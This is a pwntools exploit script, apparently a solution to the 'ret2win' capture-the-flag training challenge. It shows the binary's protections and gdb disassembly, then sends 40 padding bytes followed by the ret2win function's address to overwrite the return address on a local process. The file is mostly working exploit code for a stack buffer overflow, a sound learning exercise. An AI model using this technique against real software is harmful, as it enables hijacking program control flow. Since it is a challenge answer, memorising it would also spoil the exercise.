#!/usr/bin/env python
from pwn import *

# Solution
# python -c "print '\x90'*40+'\x11\x08@\x00\x00\x00\x00\x00'" | ./ret2win

"""
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

(gdb) disass pwnme
Dump of assembler code for function pwnme:
   0x00000000004007b5 <+0>: push   rbp
   0x00000000004007b6 <+1>: mov    rbp,rsp
   0x00000000004007b9 <+4>: sub    rsp,0x20
   0x00000000004007bd <+8>: lea    rax,[rbp-0x20]
   0x00000000004007c1 <+12>:    mov    edx,0x20
   0x00000000004007c6 <+17>:    mov    esi,0x0
   0x00000000004007cb <+22>:    mov    rdi,rax
   0x00000000004007ce <+25>:    call   0x400600 <memset@plt>
   0x00000000004007d3 <+30>:    mov    edi,0x4008f8
   0x00000000004007d8 <+35>:    call   0x4005d0 <puts@plt>
   0x00000000004007dd <+40>:    mov    edi,0x400978
   0x00000000004007e2 <+45>:    call   0x4005d0 <puts@plt>
   0x00000000004007e7 <+50>:    mov    edi,0x4009dd
   0x00000000004007ec <+55>:    mov    eax,0x0
   0x00000000004007f1 <+60>:    call   0x4005f0 <printf@plt>
   0x00000000004007f6 <+65>:    mov    rdx,QWORD PTR [rip+0x200873]        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x00000000004007fd <+72>:    lea    rax,[rbp-0x20]
   0x0000000000400801 <+76>:    mov    esi,0x32
   0x0000000000400806 <+81>:    mov    rdi,rax
   0x0000000000400809 <+84>:    call   0x400620 <fgets@plt>
   0x000000000040080e <+89>:    nop
   0x000000000040080f <+90>:    leave  
   0x0000000000400810 <+91>:    ret    
End of assembler dump.

(gdb) disass ret2win 
Dump of assembler code for function ret2win:
   0x0000000000400811 <+0>: push   rbp
   0x0000000000400812 <+1>: mov    rbp,rsp
   0x0000000000400815 <+4>: mov    edi,0x4009e0
   0x000000000040081a <+9>: mov    eax,0x0
   0x000000000040081f <+14>:    call   0x4005f0 <printf@plt>
   0x0000000000400824 <+19>:    mov    edi,0x4009fd
   0x0000000000400829 <+24>:    call   0x4005e0 <system@plt>
   0x000000000040082e <+29>:    nop
   0x000000000040082f <+30>:    pop    rbp
   0x0000000000400830 <+31>:    ret  

"""

p = process('./ret2win')
# p = gdb.debug('./ret2win',)# 'b *0x000000000040082e')


context(os='linux', arch='amd64')

payload = 'A' * 40 + p64(0x0000000000400811)
print payload
print p.recvuntil("we're using fgets!")
p.sendline(payload)
print p.recvline()
print p.recvline()
print p.recvline()

